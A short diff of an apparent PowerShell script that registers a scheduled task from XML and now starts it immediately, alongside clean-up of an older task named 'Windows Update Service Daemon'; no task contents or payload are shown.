@@ -102,8 +102,8 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
     Write-Host "Task '$updateserv' deleted."
 } else {}
-Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv
-
+Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
+Start-ScheduledTask $updateserv
 #Temporary secion for remoaval of rudimentroy file and tasks
 $daemonserv = "Windows Update Service Daemon"
 if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
